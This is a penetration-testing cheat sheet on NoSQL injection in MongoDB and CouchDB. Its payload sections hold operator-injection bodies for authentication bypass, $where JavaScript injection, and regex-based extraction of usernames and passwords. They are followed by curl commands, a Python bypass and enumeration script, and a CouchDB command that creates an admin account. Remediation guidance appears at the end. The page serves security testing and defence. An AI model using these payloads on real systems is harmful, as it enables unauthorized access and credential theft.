# NoSQL Injection (MongoDB, CouchDB)

## Overview
NoSQL injection exploits the way applications interact with non-relational databases such as MongoDB, CouchDB, Redis, and Cassandra. Unlike SQL injection which injects SQL syntax, NoSQL injection leverages the query language of the specific database — most commonly MongoDB's JSON/BSON query operators like `$where`, `$ne`, `$gt`, and `$regex`. When applications pass user-controlled data directly into database query objects without sanitization, attackers can alter query logic, bypass authentication, and exfiltrate data.

## How It Works
- MongoDB queries use JSON-like objects: `db.users.find({username: userInput, password: passInput})`
- If userInput is `{"$ne": ""}`, the query becomes: `db.users.find({username: {$ne: ""}, password: {$ne: ""}})` — returns any user.
- This is authentication bypass without SQL syntax, exploiting MongoDB's own query operators.
- PHP and Node.js applications that pass raw user-controlled objects directly to MongoDB queries are most vulnerable.
- JavaScript injection via `$where` clauses allows arbitrary JS execution within the MongoDB process.
- HTTP parameter pollution (HPP) in frameworks like Express can cause single string values to become arrays or objects, altering query behavior.

## Impact
- Authentication bypass: log in without valid credentials.
- Full database exfiltration using regex or comparison operators.
- JavaScript execution within the database context via `$where` (MongoDB 4.4 and earlier).
- Denial of service via expensive regex or JavaScript operations.
- Data modification (in write operations).
- Information disclosure about database schema and structure.

## Where to Look
- Login forms where username and password are passed to a NoSQL query.
- Search fields that use `$regex` or `$text` operators.
- API endpoints that accept JSON bodies and pass them to query methods.
- Filter and sort parameters in REST APIs.
- GraphQL queries backed by MongoDB.
- Node.js/Express apps that use `req.body` directly in MongoDB queries without validation.
- PHP apps using `$_POST['field']` directly in MongoDB query arrays.

## Testing Steps
1. Identify endpoints that interact with a NoSQL database (look for MongoDB error messages, `_id` fields, or JSON responses with NoSQL-style IDs).
2. On a login form: inject `{"$ne": "invalid"}` as both username and password.
3. Via HTTP: submit `username[$ne]=invalid&password[$ne]=invalid` (PHP array notation).
4. Via JSON body: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`.
5. Test regex injection in search fields: `{"$regex": ".*"}` to match everything.
6. Test `$where` injection: `{"$where": "1==1"}` or `{"$where": "sleep(5000)"}` for time-based.
7. For authentication bypass, observe whether login succeeds or returns a different response.
8. Enumerate users with `$gt` and `$lt` operators on username.
9. Extract data character by character using `$regex`: `{"$regex": "^a"}`, `{"$regex": "^ab"}`, etc.
10. Check CouchDB for admin access via `_all_dbs` endpoint: `GET /_all_dbs` or `PUT /_users/user`.

## Payloads / Techniques

```javascript
// MongoDB operator injection payloads

// Authentication bypass via $ne (not equal)
// URL-encoded: username[$ne]=x&password[$ne]=x
// JSON: {"username": {"$ne": "x"}, "password": {"$ne": "x"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$gte": ""}, "password": {"$gte": ""}}
{"username": {"$exists": true}, "password": {"$exists": true}}

// Login with known username, bypass password
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

// $where JavaScript injection (MongoDB 4.4 and earlier)
{"$where": "1==1"}
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}   // Time-based detection
{"$where": "function() { return this.username == 'admin'; }"}

// Extract data via regex (blind/time-based enumeration)
// Finding if username starts with 'a':
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
// Finding if username starts with 'ad':
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
// Full username enumeration:
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admi"}, "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

// Extract password characters
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^[a-z]"}}

// $in operator
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}

// $or bypass
{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$ne": ""}}
```

```bash
# HTTP parameter pollution (PHP-style array notation)
# For endpoints that parse query strings or form data

# Authentication bypass
curl -X POST https://target.com/login \
  -d "username[$ne]=invalid&password[$ne]=invalid"

curl -X POST https://target.com/login \
  -d "username[$gt]=&password[$gt]="

curl -X POST https://target.com/login \
  -d "username[$exists]=true&password[$exists]=true"

# JSON body injection
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $where injection (time-based)
curl -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "sleep(5000)"}}'
```

```python
import requests

BASE = "https://target.com"

def test_nosql_login_bypass():
    """Test various NoSQL injection auth bypass techniques."""
    
    # Test 1: $ne operator (JSON body)
    r = requests.post(f"{BASE}/api/login",
        json={"username": {"$ne": ""}, "password": {"$ne": ""}},
        headers={"Content-Type": "application/json"})
    print(f"$ne bypass (JSON): {r.status_code}")
    if r.status_code == 200 and "token" in r.text:
        print("[VULNERABLE] Authentication bypassed!")
    
    # Test 2: PHP array notation
    r2 = requests.post(f"{BASE}/login",
        data={"username[$ne]": "x", "password[$ne]": "x"})
    print(f"$ne bypass (form): {r2.status_code}")
    
    # Test 3: $gt operator
    r3 = requests.post(f"{BASE}/api/login",
        json={"username": {"$gt": ""}, "password": {"$gt": ""}})
    print(f"$gt bypass: {r3.status_code}")
    
    # Test 4: Regex match
    r4 = requests.post(f"{BASE}/api/login",
        json={"username": "admin", "password": {"$regex": ".*"}})
    print(f"Regex bypass: {r4.status_code}")

test_nosql_login_bypass()

# Blind enumeration using $regex
def enumerate_username_regex(prefix=""):
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
    for c in charset:
        r = requests.post(f"{BASE}/api/login",
            json={"username": {"$regex": f"^{prefix}{c}"},
                  "password": {"$ne": ""}})
        if r.status_code == 200:
            print(f"Username starts with: {prefix}{c}")
            enumerate_username_regex(prefix + c)
            break

enumerate_username_regex()
```

```bash
# CouchDB NoSQL injection
# Attempt to access admin endpoints
curl -si https://target.com:5984/_all_dbs
curl -si https://target.com:5984/_users/_all_docs
curl -si https://target.com:5984/secret_db/_all_docs

# CouchDB view injection
curl -si "https://target.com:5984/db/_design/auth/_view/login?key=\"admin\""

# Create admin user (if CouchDB has no admin configured - "Admin Party")
curl -si -X PUT https://target.com:5984/_config/admins/attacker \
  -d '"AttackerPassword1"'
```

## Burp Suite Tips
- **Content-Type Manipulation**: In Repeater, change `Content-Type` from `application/x-www-form-urlencoded` to `application/json` and convert the body to JSON format with operator objects. Many applications accept both formats.
- **Active Scanner**: Burp's scanner includes NoSQL injection checks — ensure the application is spidered with authenticated sessions before running the scanner.
- **Extensions — NoSQLi Scanner**: Third-party Burp extensions (e.g., "NoSQLi Scanner") add targeted NoSQL injection payloads and detection logic.
- **Intruder — Payload Sets**: Use Intruder with a custom NoSQL payload list including `[$ne]`, `[$gt]`, `[$regex]`, `[$where]` variants.
- **Match and Replace**: Add a rule to replace username/password parameter values with operator objects automatically during browsing to test all login endpoints.

## Tools
- **NoSQLMap** — automated MongoDB, CouchDB, Redis injection: `python nosqlmap.py -u https://target.com/login`
- **Burp Suite** — manual injection, scanner, extension support.
- **nosql-injection-fuzzer** (GitHub) — fuzzing tool for NoSQL parameters.
- **MongoKnife** — MongoDB-specific exploitation toolkit.
- **Mongol** — Python tool for MongoDB injection enumeration.
- **curl** — manual testing with JSON body manipulation.

## Remediation
- Never pass raw user input directly to database query objects.
- In MongoDB/Node.js: validate and sanitize all input with a schema validator (e.g., Joi, express-validator) before constructing query objects.
- Reject inputs that are objects or arrays when a string is expected — explicitly check type.
- Use MongoDB's `$eq` operator explicitly to prevent operator injection: `{username: {$eq: userInput}}` prevents object injection only if userInput is validated as a string first.
- Disable JavaScript execution in MongoDB (`security.javascriptEnabled: false` in mongod.conf) to prevent `$where` injection.
- Use MongoDB's BSON typed queries rather than raw JSON for security-critical operations.
- Apply strict input validation: reject any input containing `$`, `{`, or `.` where not expected.
- Follow least-privilege principles: database users should only have SELECT privilege where reads are needed.
- For CouchDB: always configure admin accounts — never leave "Admin Party" mode enabled.

## References
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
https://portswigger.net/web-security/nosql-injection
https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
https://github.com/codingo/NoSQLMap
https://cwe.mitre.org/data/definitions/943.html
